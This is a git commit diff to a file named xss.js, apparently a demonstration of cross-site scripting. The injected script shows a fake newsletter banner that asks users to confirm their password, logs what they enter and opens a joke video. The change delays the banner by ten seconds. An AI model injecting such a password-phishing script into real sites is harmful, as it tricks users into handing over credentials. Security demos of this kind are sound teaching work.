c05a8a0a53568cfa787b1c0e26e9e27ecc84ea71
Emilio Schaedler Heinzmann <103655828+emiliosheinz@users.noreply.github.com>
2023-10-03 14:38:26 -0300

    Update xss.js

--- public/xss.js
+++ public/xss.js
@@ -2,15 +2,17 @@ const head = document.getElementsByTagName('head')[0];
 const script = document.createElement('script');
 script.type = 'text/javascript';
 script.innerHTML = `
-  const bannerNotification = document.getElementsByClassName("banner-notifications")[0];
-  const notification = document.createElement("div");
-  notification.className = "alert alert-primary";
-  notification.innerHTML = "Have you already signed in for the newsletter? If not, please, click this notification. You will be asked to confirm your password and then you will be redirected to the newsletter page :)";
-  notification.onClick = function() {
-    const password = window.prompt("Confirm your password")
-    console.log(password);
-    window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
-  }
-  bannerNotification.appendChild(notification);
+  setTimeout(() => {
+    const bannerNotification = document.getElementsByClassName("banner-notifications")[0];
+    const notification = document.createElement("div");
+    notification.className = "alert alert-primary";
+    notification.innerHTML = "Have you already signed in for the newsletter? If not, please, click this notification. You will be asked to confirm your password and then you will be redirected to the newsletter page :)";
+    notification.onClick = function() {
+      const password = window.prompt("Confirm your password")
+      console.log(password);
+      window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
+    }
+    bannerNotification.appendChild(notification);
+  }, 10000)
 `;
 head.appendChild(script);
